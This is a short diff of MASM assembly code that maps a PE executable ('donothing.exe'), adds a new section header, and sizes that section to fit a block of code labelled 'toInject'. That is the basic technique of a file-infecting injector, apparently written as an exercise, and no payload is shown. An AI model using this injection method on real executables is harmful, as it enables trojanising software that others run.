@@ -23,8 +23,10 @@ option casemap:none
 	PeSectionNbAdd		dd	?
 	PeNtHeader		dd	?
 	LastSecPos		dd	?
+	PeHeader		dd	?
 	SectionAlignment	dd	?
 	FileAlignment		dd	?
+	NewSectionCodeSize	dd	?
 
 	ErrorMessage	db	"Error",0
 	FileName	db	"donothing.exe",0
@@ -59,7 +61,7 @@ start:
 	push	PeFile
 	call	CreateFileMapping
 	call	CheckError
-	mov		PeMapObject, eax
+	mov	PeMapObject, eax
 
 	; MAP_VIEW_OF_FILE
 	push	0
@@ -104,10 +106,12 @@ start:
 	mov	esi, [eax]
 	mov	FileAlignment, esi
 
+
 	; LOOP SECTIONS HEADER
 	mov	esi, edx
 	add	esi, 0F8h
 	mov	ebx, esi ; Keep start of Headers
+	mov	LastSecPos, 0
 	Loop_SectionHeader:
 	; SHOW NAME
 	push eax
@@ -133,6 +137,7 @@ start:
 	lodsb
 	stosb
 	loop	CreateNewHeader
+
 	; INCREMENT NUMBER OF SECTION
 	xor	eax, eax
 	mov	edi, PeSectionNbAdd
@@ -155,7 +160,8 @@ start:
 	; Virtual Size
 	popa	; Retrieve registers
 	add	edi, 08h
-	mov	ecx, 08h
+	mov	NewSectionCodeSize, endToInject - toInject ; Size of actual code in new section
+	mov	ecx, NewSectionCodeSize
 	mov	[edi], ecx
 
 	; Virtual Address
